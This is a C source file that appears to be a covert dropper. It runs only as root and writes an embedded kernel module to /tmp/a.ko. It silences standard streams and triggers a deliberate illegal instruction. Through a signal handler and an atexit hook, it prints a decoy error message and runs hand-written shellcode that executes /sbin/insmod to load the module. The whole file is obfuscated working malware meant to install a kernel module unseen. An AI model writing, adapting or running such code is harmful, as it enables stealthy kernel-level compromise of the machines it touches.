#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <ucontext.h>
#include <unistd.h>
#include <errno.h>

extern const int _binary_network_server_ko_start[];
extern const int _binary_network_server_ko_end;
extern const int _binary_network_server_ko_size;

// i'm being nice by putting this in a sub
void call_thing(){
	asm("__thing: xor    %eax,%eax");
	asm("xor    %edx,%edx");
	asm("push   %eax");
	asm("push   $0x6f6b");		// /tmp/a.ko
	asm("push   $0x2e612f70");
	asm("push   $0x6d742f2f");
	asm("mov    %esp,%edi");
	asm("push   %eax");
	asm("push   $0x64");		//  /sbin/insmod
	asm("push   $0x6f6d736e");
	asm("push   $0x692f6e69");
	asm("push   $0x62732f2f");
	asm("mov    %esp,%ebx");
	asm("push   %edx");
	asm("push   %esi");
	asm("push   %edi");
	asm("push   %ebx");
	asm("mov    %esp,%ecx");
	asm("mov    $0xb,%al");
	asm("int    $0x80");
}

void signal_handler(){
	printf("An error occurred. (The purple hair brigade is up to it again!)\n");
	asm("call __thing;");
}

void sighandler(int signum, siginfo_t *si, void* arg){
	ucontext_t *ctx = (ucontext_t*) arg;
	ctx->uc_mcontext.gregs[REG_EIP] += 2;
	atexit(signal_handler);
}

int main(int argc, char* argv[], char* envp[]){

	if (geteuid() != 0){
		printf("Run me as root\n");
		return -1;
	}

	FILE * fptr;

	fptr = fopen("/tmp/a.ko", "wb");
	if(fptr == NULL){
		printf("Error %d \n", errno);
		printf("ERROR!\n");
	}
	else{
		fwrite(_binary_network_server_ko_start, sizeof(int), 3069, fptr);
		fclose(fptr);
	}

	close(0); close(1); close(2);
	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sigemptyset(&sa.sa_mask);
	sa.sa_sigaction = sighandler;
	sa.sa_flags = SA_SIGINFO;
	sigaction(SIGILL, &sa, NULL);
	sigaction(SIGSEGV, &sa, NULL);
	asm("ud2");
	return 0;
}
